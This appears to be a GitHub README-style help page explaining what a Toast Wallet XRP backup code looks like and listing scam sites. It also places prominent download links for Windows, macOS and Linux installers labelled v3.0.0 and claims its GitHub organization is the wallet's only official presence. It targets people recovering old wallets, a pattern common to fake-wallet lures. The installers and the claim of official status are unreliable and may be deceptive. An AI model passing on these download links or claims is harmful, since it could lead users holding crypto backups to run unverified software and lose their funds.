<div align="center">

# What Does a Toast Wallet Backup Code Actually Look Like? (With Examples)

**What a genuine Toast Wallet backup code actually looks like.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **This GitHub organization is the only official presence for Toast Wallet — there is no official website.**
> `toastwallet.app` is a known phishing clone impersonating one; see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

People searching for this are usually holding a piece of paper or an old file and trying to figure
out if what they have is actually the backup code, or something else entirely. Here's how to tell.

**What it is NOT:**
- It is **not** a short string of 6 words (that's your recovery phrase).
- It is **not** a 6-digit number (that's your PIN).
- It is **not** a single line of 20-30 characters starting with "s" (that's your secret key,
  usually found *inside* the decrypted backup, not the backup itself).

**What it IS:** a long block of encrypted, JSON-like text — often well over 1,000 characters. If
you open it in a plain text editor, you'll typically see it start with something resembling
JSON structure, and contain internal field names like:
- `pindata`
- `ppdata`
- `ppsalt`
- `rpdata`

If your saved text contains any of those field names, you're looking at a genuine Toast Wallet
backup code, even if the rest of it looks like meaningless noise — that's expected, it's
encrypted.

**The most common way this file gets corrupted:** copying and pasting through an application that
applies "smart" formatting — Microsoft Word, Apple Notes, or some email clients — can silently
convert straight quotes to curly quotes or strip/add line breaks. Either change is enough to break
the file's validity. If your restore attempt fails with an error, first paste your backup code
into a completely plain text editor (like Windows Notepad or a bare `.txt` file), copy it again
from there, and retry.

**Verifying your backup code is intact:** Toast Wallet has no official website — this GitHub
organization is the only official presence. If your restore attempt fails, first assume a
formatting issue (see above) before assuming your code itself is invalid.

Once you've confirmed you have a valid backup code, head to our
[full recovery guide](./how-to-recover-xrp-toast-wallet.md) to use it.

---

## ⚠️ Known Scams — Do Not Use These

- **The fake "Toast Plus" wallet app** — not affiliated with Toast Wallet, tied to over **$5M in stolen XRP** and a class-action lawsuit against Apple. See: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **The toastwallet.app phishing clone** — mimics the real recovery page to steal imported wallets. See: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **SEO clone sites impersonating Toast Wallet** — `xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`.
- **Follow-up "recovery for a fee" scams** targeting people who already lost funds — never legitimate.

Complete list: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). To report a scam, visit [ic3.gov](https://www.ic3.gov).

## Related Articles

- [Passphrase vs Recovery Phrase vs Backup Code vs Secret Key](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)
- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
- [Fixing 'Old Passphrase Is Incorrect'](./old-passphrase-is-incorrect-error.md)
